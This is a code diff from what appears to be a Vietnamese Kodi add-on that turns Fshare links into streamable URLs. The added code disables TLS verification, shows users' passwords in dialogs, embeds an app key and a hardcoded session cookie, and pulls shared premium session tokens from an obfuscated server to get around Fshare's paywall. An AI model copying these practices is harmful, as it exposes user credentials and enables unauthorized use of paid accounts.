 			refer = "|User-Agent=Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F58.0.3029.110%20Safari%2F537.36&Referer=http%3A%2F%2Fhplus.com.vn%2F"
 			return (video_url + refer)
+			
 		except Exception as e:
 			notify('Khong lay duoc link')
 			pass
@@ -986,95 +1285,98 @@ def get_hash(m):
 		s = s + code[random.randint(0,len(code)-1)] 
     
 	return s
-def get_linkvips(fshare_url,username, password):
-	
-	host_url = 'http://linksvip.net/?ref=9669'
-	login_url = 'http://linksvip.net/login/'
-	logout_url = 'http://linksvip.net/login/logout.php'
-	getlink_url = 'http://linksvip.net/GetLinkFs'
-	
-	response = fetch_data(host_url)
-	if not response:
+def convert_ipv4_url(url):
+	host = re.search('//(.+?)(/|\:)', url).group(1)
+	addrs = socket.getaddrinfo(host,443)
+	ipv4_addrs = [addr[4][0] for addr in addrs if addr[0] == socket.AF_INET]
+	url = url.replace(host, ipv4_addrs[0])
+	return url
+def checkAccFshare():
+	if len(ADDON.getSetting('fshare_username')) == 0 or len(ADDON.getSetting('fshare_password')) == 0:
+		alert(u'Bạn chưa nhập [COLOR red]tài khoản cá nhân Fshare[/COLOR]'.encode("utf-8"))
 		return
+def login_f():
+	import requests
+	checkAccFshare()
+	username = ADDON.getSetting('fshare_username')
+	password = ADDON.getSetting('fshare_password')
+	payload = '{"app_key":"L2S7R6ZMagggC5wWkQhX2+aDi467PPuftWUMRFSn","user_email":"'+username+'","password":"'+password+'"}'
+	headers = {'cache-control': "no-cache"}
+	try:
+		response = requests.post("https://118.69.164.19/api/user/login", data=payload, headers=headers,verify=False)
+		jStr = json.loads(response.content)
+		msg = jStr['msg']
+		notify(msg)
+		if 'fail' in msg:
+			line = "Double check your username and password again:\n"
+			line += "Username: [COLOR yellow]%s[/COLOR]\n" % username
+			line += "Password: [COLOR yellow]%s[/COLOR]\n" % password
+			alert(line,title="Fshare Account")
+			ADDON.openSettings()
+			return
+		code = jStr['code']
+		if response.status_code == 200:
+			token = jStr['token']
+			session_id = jStr['session_id']
+			header = {'Cookie' : 'session_id=' + session_id}
+			ADDON.setSetting(id="tokenfshare",value=token)
+			ADDON.setSetting(id="sessionfshare",value=session_id)
+			return (token,session_id)
+	except:
+		alert("Bạn nhập sai vui lòng kiểm tra lại.\nUsername: [COLOR yellow]%s[/COLOR]-Pass: [COLOR yellow]%s[/COLOR]" % (username,password))
+		pass
 	
-	cookie = response.cookiestring
-
-	headers = { 
-				'User-Agent' 	: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
-				'Cookie'		: cookie,
-				'Referer'		: host_url,
-				'Content-Type'	: 'application/x-www-form-urlencoded; charset=UTF-8',
-				'Accept'		: 'application/json, text/javascript, */*; q=0.01',
-				'X-Requested-With'	: 'XMLHttpRequest'
-            }
-	
-	data = {
-			"u"				: username,
-			"p"				: password,
-			"auto_login"	: 'checked'
-		}
-
-	response = fetch_data(login_url, headers, data)
-
-	video_url = ''
-	if response.status == 200:
-		json_data = json.loads(response.body)
-		if int(json_data['status']) == 1:
-			cookie = cookie + ';' + response.cookiestring
-			headers['Cookie'] = cookie
-			data = {
-				"link"			: fshare_url,
-				"pass"			: 'undefined',
-				"hash"			: get_hash(32),
-				"captcha"		: ''
-
-			}
-			headers['Accept-Encoding'] = 'gzip, deflate'
-			headers['Accept-Language'] = 'en-US,en;q=0.8,vi;q=0.6'
-			
-			response = fetch_data(getlink_url, headers, data)
-
-			json_data = json.loads(response.body)
-
-			link_vip = json_data['linkvip']
-			
-			response = fetch_data(link_vip, headers)
-
-			match = re.search(r'id="linkvip"\stype="text"\svalue="(.*?)"', response.body)
-			if not match:
-				return ''
-			video_url = match.group(1)
-			video_url = video_url.replace("[LinksVIP.Net]", "")
-			xbmc.log(video_url)
-			#logout
-			response = fetch_data(logout_url, headers)
-			
-	return video_url
-
-def get_4share(url):
-	cookie = 'SHARINGSESSID4S=hpd9hdj8j1hnaseba6uicc6ss5'
-	headers = {
-			'User_Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
-			'Referer': 'http://4share.vn/',
-			'Host'	: '4share.vn',
-			'Cookie': cookie
-			}
-	response = urlfetch.get(url, headers=headers)
-	matches = re.search(r"text-decoration:none' href='(.+?)'", response.body)
-	direct_url = matches.group(1)
-	
-	refer = "|User-Agent=Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F58.0.3029.110%20Safari%2F537.36"
-	return direct_url+refer
+def check_file_info(url):
+	url = 'https://murmuring-fortress-18529.herokuapp.com/check_file.php?url=%s' % url
+	r = urlfetch.get(url)
+	status = re.search(r"status=(\d+)",r.body).group(1) 
+	name = re.search(r"name=(.+)",r.body).group(1)
+	name = name.replace(' - Fshare','')
+	name=name.strip()
+	return (status,name)
 		
-	
+def get_file_info(url,session_id,token):
+	data   = '{"token" : "%s", "url" : "%s"}' % (token,url)
+	header = {'Cookie' : 'session_id=' + session_id}
+	r = requests.post('https://118.69.164.19/api/fileops/get',headers=header,data=data, verify=False)
+	regex = r"\"pwd\":(.+?),"
+	match = re.search(regex,r.content)
+	password = match.group(1)
+	return password
 def get_fshare(url):
-	response = urlfetch.get(url)
-	if 'Tập tin quý khách yêu cầu không tồn tại' in response.body:
-		notify('Tập tin quý khách yêu cầu không tồn tại')
-		sys.exit("Error message")
-	def checkpass(url):
-		response = urlfetch.get(url)
-		if 'Tập tin có mật khẩu bảo vệ' in response.body:
+	if len(url) == 12 or len(url) == 15:
+		url = 'https://www.fshare.vn/file'+url
+	
+	url = url.replace('http://', 'https://')
+	username = ADDON.getSetting('fshare_username')
+	password = ADDON.getSetting('fshare_password')
+	fshare_option = ADDON.getSetting('fshare_option')
+	token = ADDON.getSetting('tokenfshare')
+	session_id = ADDON.getSetting('sessionfshare')
+	F = 'U2FsdGVkX1+oRjEcO06h18WuKSLFnniVhsVxR1l2aUWLmQAC3v4KfeXi5Xx5I11I'
+	
+	def check_user(session_id):
+		
+		import requests
+		headers = {'cookie': "session_id="+session_id}
+		response = requests.get("https://118.69.164.19/api/user/get", headers=headers,verify=False)
+		jStr = json.loads(response.content)
+		c = jStr['account_type']
+		return(c)
+		
+					
+			
+	def fshare_download(url,session_id,token):
+		import requests
+		url =urllib.unquote(url)
+		url = removeNonAscii(url)
+		
+		try:
+			password1 = get_file_info(url,session_id,token)
+		except:
+			password1 = 'null'
+			
+		if password1 != 'null':
 			keyboardHandle = xbmc.Keyboard('','Nhập mật khẩu bảo vệ của tập tin')
 			keyboardHandle.doModal()
 			if (keyboardHandle.isConfirmed()):
@@ -1083,222 +1385,97 @@ def get_fshare(url):
 					return
 				queryText = urllib.quote_plus(queryText)
 				password1 = queryText
-				return password1
+				
 			else:
 				return
-	
-	url = url.replace('http://', 'https://')
-	if '-' in url:
-		matches = re.search(r"(http.*)-(.*)", url)
-		password1 = matches.group(2)
-		url = matches.group(1)
 		
-	else:
-		password1 = checkpass(url)
-		#notify(password1)
-
-	match = re.search(r"(https://)", url)
-	if not match:
-		url = 'https://'+url
-	else:
-		url = url
 		
-	username = ADDON.getSetting('fshare_username')
-	password = ADDON.getSetting('fshare_password')
-	fshare_option = ADDON.getSetting('fshare_option')
-	F = 'U2FsdGVkX1+oRjEcO06h18WuKSLFnniVhsVxR1l2aUWLmQAC3v4KfeXi5Xx5I11I'
-	def check_user(session_id):
-		f = 'U2FsdGVkX1+fntz3Jv92YvlUvQk6pEhgPiGKJcEBVtVH9lpd8YS6idK8G9Lr7etACq/sLnO12tI2klwOz9QQWQ'
-		headers = {'cookie': "session_id="+session_id}
-		response = urlfetch.get(vmf.gibberishAES(f, 'Faidemteiv'), headers=headers)
-		jStr = json.loads(response.body)
-		c = jStr['account_type']
-		return(c)
-	
-	def fshare_download(url, username, password):
-		payload = '{"app_key":"L2S7R6ZMagggC5wWkQhX2+aDi467PPuftWUMRFSn","user_email":"'+username+'","password":"'+password+'"}'
-		headers = {'cache-control': "no-cache"}
-		f = 'U2FsdGVkX1+DNcAz9bYFd5cYzmMSxkO6cjEESsnvnFDRwI/cJ7q9e3PMqRvzhaQG/3AKt6uXJwS1dzBpPGlotw'
-		response = urlfetch.post(vmf.gibberishAES(f, 'Faidemteiv'), data=payload, headers=headers)
+		data   = '{"token" : "%s", "url" : "%s", "password" : "%s"}'
+		header = {'Cookie' : 'session_id=' + session_id}
+		data   = data % (token, url, password1)
 		
-		if '405' in response.body:
-			alert('Không đăng nhập được. Kiểm tra lại username và mật khẩu.\nUser: [COLOR yellow]' + username+'[/COLOR]\nPassword: [COLOR yellow]'+password+'[/COLOR]','Fshare thông báo')
-			sys.exit	
+		t = requests.post("https://118.69.164.19/api/session/download", headers=header, data=data, verify=False)
+		#TextBoxes("VMF",t.content)
+		jStr = json.loads(t.content)
+		#Check file
 		
-		jStr = json.loads(response.body)
-		code = jStr['code']
-		msg = jStr['msg']
-		token = jStr['token']
-		session_id = jStr['session_id']
-		t = check_user(session_id)
-		t = str(t)
-		
-		if code == 200:
-			notify ('Đăng nhập thành công')
-			notify ('Tài khoản là: [COLOR red]'+t+'[/COLOR]')
-			f = 'U2FsdGVkX1/vJ77W7WEfjOu+hZeMdqup95C+GE85n+a+y7jPpVuWQ/84LkPrQvpvA0xuchHX/FwK++XMK+EnVg'
-			data   = '{"token" : "%s", "url" : "%s", "password" : "%s"}'
-			header = {'Cookie' : 'session_id=' + session_id}
-			data   = data % (token, url, password1)
-			t = urlfetch.post(vmf.gibberishAES(f, 'Faidemteiv'), headers=header, data=data)
-			jStr = json.loads(t.body)
+		if '404' in t.content:
+			notify("Tập tin không tồn tại")
+			sys.exit()
+		else:	
+			vDialog.create('Fshare','Bắt đầu Play')
 			video_url = jStr['location']
-			if not video_url:
+			video_url = convert_ipv4_url(video_url)
+			if len(video_url) == 0:
 				notify('Link hỏng')
-		return video_url	
-		
-	def getlink(url, username, password):
-		login_url = 'https://www.fshare.vn/login'
-		logout_url = 'https://www.fshare.vn/logout'
-		download_url = 'https://www.fshare.vn/download/get'
-		notify (u'VMF Getlink system'.encode("utf-8"))
-		response = fetch_data(login_url)
-		if not response:
-			return
-
-		csrf_pattern = '\svalue="(.+?)".*name="fs_csrf"'
-
-		csrf=re.search(csrf_pattern, response.body)
-		fs_csrf = csrf.group(1)
-
-		headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 VietMedia/1.0', 'Cookie': response.cookiestring}
-		
-		data = {
-				"LoginForm[email]"		: username,
-				"LoginForm[password]"	: password,
-				"fs_csrf"				: fs_csrf
-			}
-
-		response = fetch_data(login_url, headers, data)
-		if 'Sai tên đăng nhập hoặc mật khẩu.' in response.body:
-			alert('Sai tên đăng nhập hoặc mật khẩu. Xin vui lòng kiểm tra lại user và password', '[COLOR yellow]Fshare thông báo[/COLOR]')
-			sys.exit
-		check_acc = fetch_data('https://www.fshare.vn/account/infoaccount', headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 VietMedia/1.0', 'Cookie': response.cookiestring})
-		regex = r"data-target=\"#member\">(.+?)</a>"
-		ma_tk=re.search(regex, check_acc.body)
-		ma_tk=ma_tk.group(1)
-		notify1('Tài khoản Fshare của bạn là: [COLOR red]'+ma_tk+'[/COLOR]')
-		headers['Cookie'] = response.cookiestring
-		headers['Referer'] = url
-		direct_url = ''
-		attempt = 1
-		MAX_ATTEMPTS = 3
-		file_id = os.path.basename(url)
-		if response and response.status == 302:
-			notify (u'Đang xử lý lấy link'.encode("utf-8"))
-			while attempt < MAX_ATTEMPTS:
-				if attempt > 1: sleep(2)
-				notify (u'Lấy link lần thứ #%s'.encode("utf-8") % attempt)
-				attempt += 1
-
-				response = fetch_data(url, headers, data)
-
-				if response.status == 200:
-					csrf=re.search(csrf_pattern, response.body)
-					fs_csrf = csrf.group(1)
-					data = {
-							'fs_csrf'					: fs_csrf,
-							'ajax'						: 'download-form',
-							'DownloadForm[pwd]'			: password1,
-							'DownloadForm[linkcode]'	: file_id
-						}
-
-					response=fetch_data(download_url, headers, data);
-
-					json_data = json.loads(response.body)
-
-					if json_data.get('url'):
-						direct_url = json_data['url']
-						
-					elif json_data.get('msg'):
-						notify(json_data['msg'].encode("utf-8"))
-					else:
-						notify('Kiểm tra lại user, mật khẩu, mã password')
-				elif response.status == 302:
-					direct_url = response.headers['location']
-					
-				else:
-					notify (u'Lỗi khi lấy link, mã lỗi #%s. Đang thử lại...'.encode("utf-8") % response.status)
-
-			response = fetch_data(logout_url, headers)
-			if response.status == 302:
-				notify (u'Done'.encode("utf-8"))
-		else:
-			notify (u'Lấy link không thành công.'.encode("utf-8"))
-		if len(direct_url) > 0:
-			notify (u'Đã lấy được link'.encode("utf-8"))
-		else:
-			notify (u'Có sự cố khi lấy link. Xin vui lòng thử lại'.encode("utf-8"))
-
-		return direct_url
+			vDialog.close()
+			
+			return video_url	
 	#+++++++++++++++++	
 	if fshare_option == "true":
 		if len(username) == 0  or len(password) == 0:
-			alert(u'Bạn chưa nhập [COLOR red]VMF[/COLOR] code hoặc tài khoản cá nhân Fshare'.encode("utf-8"), 'Soạn tin: [COLOR red]VMF[/COLOR] gửi [COLOR red]8798[/COLOR] để lấy VMF Code')
+			alert(u'Bạn chưa nhập tài khoản cá nhân Fshare'.encode("utf-8"), 'Mua VIP, liên hệ [COLOR yellow]vietkodi@gmail.com[/COLOR]')
 			return
 		else:
-			try:
-				notify('Đang lấy link')
-				#return fshare_download(url, username, password)
-				return getlink(url, username, password)
-			except:
-				notify('Không đăng nhập được tài khoản')
-				
 			
-	
+			#Check valid file
+			try:
+				c = check_user(session_id)
+				notify('Tài khoản của bạn là: '+str(c))
+				video_url = fshare_download(url,session_id,token)
+				if len(video_url)>0:
+					return video_url
+				
+			except:
+				notify("Try one more")
+				token,session_id = login_f()
+				video_url = fshare_download(url,session_id,token)
+				if len(video_url)>0:
+					return video_url
+				else:alert("Không nhận được video link")
+				
+					
+					
+			
 	if fshare_option == "false":	
+		
+		if len(ADDON.getSetting('fshare_username')) > 0 and len(ADDON.getSetting('fshare_password')) > 0:
+			file_type, name = check_file_info(url)
+			if file_type == '2':
+				alert("Link này không có thực or đã bị xoá")
+				sys.exit()
 		if len(USER_VIP_CODE) == 0:
-			alert(u'Bạn chưa có tài khoản cá nhân Fshare'.encode("utf-8"))
+			alert(u'Bạn cần tài khoản Fshare Vip. Liên hệ vietkodi@gmail.com'.encode("utf-8"))
 			return
 		if len(USER_VIP_CODE) > 0:
-			download_url = 'https://www.fshare.vn/download/get'
 			
 			try:
-				response = fetch_data(VIETMEDIA_HOST + vmf.gibberishAES(F1, 'idok'))
-				json_data = json.loads(response.body)
-				a =json_data['ttt']
-				c = a.split('|')
-				for x in c:
+				response = fetch_data((vmf.XvaYOy8Z4Djz(WcLeeL0vZik1('98888775512255778954','moCKaJt7pquBZIyij42Jq5KQh6SSj5GtmqSNZYFjpqiPfKKvhKd3o5x8caCRaomll2Nma4-jjaGZam5pm2uNdQ=='))))
+				j = json.loads(response.body)
+				session_id = j['username']
+				t = vmf.gibberishAES(session_id, 'Faidemteiv')
+				session_id,token = t.split('|')
+				#vDialog.close()
+				return fshare_download(url,session_id,token)
+				
+				
+			except:
+				try:
+					#vDialog.create('Fshare','Chuẩn bị play...')
+					response = fetch_data((vmf.XvaYOy8Z4Djz(WcLeeL0vZik1('98888775512255778954','moCKaJt7pquBZIyij42Jq5KQh6SSj5GtmqSNZYFjpqiPfKKvhKd3o5x8caCRaomll2Nma4-jjaGZam5pm2uNdQ=='))))
+					j = json.loads(response.body)
+					session_id = j['username']
+					t = vmf.gibberishAES(session_id, 'Faidemteiv')
+					session_id,token = t.split('|')
+					#vDialog.close()
+					return fshare_download(url,session_id,token)
+				except:
+					pass
 					
-					file_id = re.search(r"file\/(.+)", url).group(1)
-					headers = { 
-								'User-Agent' 	: 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
-								'Cookie':'session_id='+x
-							}
-					response = urlfetch.get(url, headers=headers)
-					if 'Tài khoản VIP là tài khoản trả tiền của Fshare' in response.body or 'Tài khoản BUNDLE là tài khoản KM theo gói Internet FPT' in response.body and 'getlink' not in response.body:
-						fs_csrf = re.search(r"fs_csrf:'(.+?)'", response.body).group(1)
-						headers = { 
-									'User-Agent' 	: 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
-									'Cookie':'session_id='+x
-								}
-						
-						data = {
-									'fs_csrf'					: fs_csrf,
-									'ajax'						: 'download-form',
-									'DownloadForm[pwd]'			: '',
-									'DownloadForm[linkcode]'	: file_id,
-									'underfined'				: 'underfined'
-								}
-						response=urlfetch.post(download_url, headers=headers, data=data);
-						json_data = json.loads(response.body)
-						if json_data.get('url'):
-							if len(json_data['url']) > 0:
-								video_url =	json_data['url']
-								return (video_url)
-						break			
-			except Exception as e:
-				alert('Sử dụng tài khoản Fshare VIP cá nhân để play. Liên hệ [COLOR yellow]vietkodi@gmail.com[/COLOR] để mua Fshare VIP', 'VMF code lỗi')
-				pass									
-						
+			else:
+				notify('Server error. Try again in 5 or 10 minutes.')
+				
 			
 		
-def forceUpdate():
-	xbmc.executebuiltin('UpdateAddonRepos()')
-	xbmc.executebuiltin('UpdateLocalAddons()')
-	DIALOG = xbmcgui.Dialog()
-	notify('Kiểm tra cập nhật.')
-	if DIALOG.yesno(ADDON_NAME, "Đi đến mục kiểm tra update hay không?", yeslabel="Go to Page", nolabel="No Thanks"):
-		xbmc.executebuiltin('ActivateWindow(10040,"addons://outdated/",return)')
-	return 'checkupdate'
+
 
